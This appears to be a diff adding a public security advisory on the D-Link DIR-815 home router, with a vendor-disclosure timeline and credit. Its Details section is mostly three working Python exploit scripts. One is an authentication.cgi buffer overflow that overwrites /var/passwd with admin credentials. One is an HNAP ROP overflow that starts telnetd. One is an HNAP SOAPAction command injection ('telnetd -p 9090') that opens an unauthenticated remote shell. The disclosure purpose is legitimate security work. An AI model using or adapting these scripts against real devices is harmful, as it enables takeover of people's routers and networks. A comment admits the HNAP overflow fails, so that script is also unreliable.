@@ -1,0 +1,88 @@
+## Advisory Information
+
+Title: DIR-815 Buffer overflows and Command injection in authentication and HNAP functionalities
+Vendors contacted: William Brown <william.brown@dlink.com>, Patrick Cline patrick.cline@dlink.com(Dlink)
+CVE: None
+
+Note: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, 
+http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061
+
+However, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares. The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes.
+
+## Product Description
+
+DIR-815 -- Wireless N300 Dual Band Router. Mainly used by home and small offices.
+
+## Vulnerabilities Summary
+
+Have come across 3 security issues in DIR-815 firmware which allows an attacker to exploit command injection and buffer overflows in authentication adn HNAP functionality. All of them can be exploited by an unauthentictaed attacker. The attacker can be on wireless LAN or WAN if mgmt interface is exposed to attack directly or using XSRF if not exposed.
+
+## Details
+
+Buffer overflow in auth 
+----------------------------------------------------------------------------------------------------------------------
+import urllib
+import urllib2
+
+# This exploits the auth_main.cgi with read buffer overflow exploit for v2.02
+# prequisite is just to have id and password fields in params
+
+url = 'http://192.168.0.1/authentication.cgi'
+junk = "A"*1004+"B"*37+"\x58\xf8\x40\x00" # address of system function in executable
+junk+="X"*164+'echo  "Admin" "Admin" "0" > /var/passwd\x00'+"AAAA"
+values = "id=test&password=test&test="+junk
+
+
+req = urllib2.Request(url, values)
+response = urllib2.urlopen(req)
+the_page = response.read()
+
+----------------------------------------------------------------------------------------------------------------------
+
+Buffer overflow in HNAP
+----------------------------------------------------------------------------------------------------------------------
+import socket
+import struct
+
+
+# format junk+ROP1(have right value in A0) + ROP2(add or subtract to create right system address) + ROP3(Jump to right address)
+
+buf = "POST /HNAP1/ HTTP/1.0\r\nHOST: 192.168.1.8\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + ";sh;"+"H"*286 
+buf+= "\x40\xF4\xB1\x2A" # (ROP gadget which puts right value in A0)
+buf+= "B"*20+"ZZZZ"+"telnetd -p 6778"+"C"*5 # adjustment to get to the right payload
+buf+="\xA0\xb2\xb4\x2a" # The system address is 2Ab4b200 so changing that in GDB just before jumping to test if it works which it does not
+buf+= "\r\n" + "1\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("1.2.3.4", 80))
+s.send(buf)
+
+
+----------------------------------------------------------------------------------------------------------------------
+
+Command injection in 
+----------------------------------------------------------------------------------------------------------------------
+import socket
+import struct
+
+# CSRF or any other trickery, but probably only works when connected to network I suppose 
+
+buf = "POST /HNAP1/ HTTP/1.0\r\nHOST: 99.249.143.124\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + ';telnetd -p 9090;\r\n' + "1\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.0.1", 80))
+s.send(buf)
+
+----------------------------------------------------------------------------------------------------------------------
+
+## Report Timeline
+
+* April 26, 2015: Vulnerability found by Samuel Huntley and reported to William Brown and Patrick Cline.
+* July 17, 2015: Vulnerability was fixed by Dlink as per the email sent by the vendor
+* Nov 13, 2015: A public advisory is sent to security mailing lists.
+
+## Credit
+
+This vulnerability was found by Samuel Huntley
